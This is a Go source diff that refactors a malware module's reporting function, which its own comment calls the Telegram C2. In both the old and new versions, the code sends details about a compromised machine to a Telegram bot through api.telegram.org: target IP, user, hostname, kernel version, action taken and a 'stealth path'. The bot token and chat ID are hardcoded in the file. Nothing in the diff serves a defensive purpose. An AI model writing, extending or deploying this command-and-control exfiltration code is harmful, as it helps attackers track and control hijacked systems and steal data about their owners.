@@ -12,11 +12,11 @@ import (
 )
 
 var (
-	botToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
-	chatID   = "5439698489"
+	GlobalTelegramToken  = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
+	GlobalTelegramChatID = "5439698489"
 )
 
-func getKernelVersion() string {
+func GetKernelVersion() string {
 	if runtime.GOOS == "windows" {
 		return "Windows"
 	}
@@ -29,44 +29,39 @@ func getKernelVersion() string {
 
 // AlertData represents the structured content for a system alert.
 type AlertData struct {
-	EventType string
-	Hostname  string
-	User      string
-	IP        string
-	FilePath  string
-	Details   string
+	Type          string
+	IP            string
+	User          string
+	Hostname      string
+	KernelVer     string
+	ActionDetails string
+	StealthPath   string
 }
 
 // SendAlert sends a structured HTML report to the Telegram C2.
-func SendAlert(data AlertData) error {
-	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+func SendAlert(event AlertData) error {
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", GlobalTelegramToken)
 
-	report := fmt.Sprintf(
-		"SYSTEM ALERT: [%s]\n"+
-			"------------------------------------------------------------\n"+
-			"TARGET IP    : %s\n"+
-			"USER         : %s\n"+
-			"HOSTNAME     : %s\n"+
-			"KERNEL VER   : %s\n"+
-			"ACTION       : %s\n"+
-			"STEALTH PATH : %s\n"+
-			"TIMESTAMP    : %s\n"+
-			"------------------------------------------------------------\n"+
-			"INFO         : %s",
-		data.EventType,
-		data.IP,
-		data.User,
-		data.Hostname,
-		getKernelVersion(),
-		data.EventType,
-		data.FilePath,
-		time.Now().Format("2006-01-02 15:04:05"),
-		data.Details,
+	if event.KernelVer == "" {
+		event.KernelVer = GetKernelVersion()
+	}
+
+	payload := fmt.Sprintf(
+		"<b>SYSTEM ALERT: [%s]</b>\n"+
+			"<b>TARGET IP    :</b> <code>%s</code>\n"+
+			"<b>USER         :</b> <code>%s</code>\n"+
+			"<b>HOSTNAME     :</b> <code>%s</code>\n"+
+			"<b>KERNEL VER   :</b> <code>%s</code>\n"+
+			"<b>ACTION       :</b> %s\n"+
+			"<b>STEALTH PATH :</b> <code>%s</code>\n"+
+			"<b>TIMESTAMP    :</b> %s",
+		event.Type, event.IP, event.User, event.Hostname, event.KernelVer,
+		event.ActionDetails, event.StealthPath, time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
 	)
 
 	vals := url.Values{}
-	vals.Set("chat_id", chatID)
-	vals.Set("text", report)
+	vals.Set("chat_id", GlobalTelegramChatID)
+	vals.Set("text", payload)
 	vals.Set("parse_mode", "HTML")
 	vals.Set("disable_web_page_preview", "true")
 
